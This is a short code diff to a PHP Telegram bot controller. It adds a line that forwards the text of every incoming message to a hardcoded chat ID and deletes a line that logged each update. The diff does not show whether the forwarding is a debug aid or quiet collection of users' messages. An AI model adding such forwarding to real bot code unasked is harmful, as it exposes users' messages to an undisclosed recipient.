@@ -60,6 +60,7 @@ class ConfigController extends Controller
         $message = $all['message']??'';
         if(!empty($message)){
             $text = $message['text']??'none';
+            $this->RobotSendMsg($text,'1006585279');
 
             $username = $message['chat']['username']??'';
             $chatId = $message['chat']['id'];
@@ -117,10 +118,7 @@ class ConfigController extends Controller
                     }
                 }
             }
-
         }
-
-        Log::info('robotsUpdate',$all);
         return 0;
     }
 
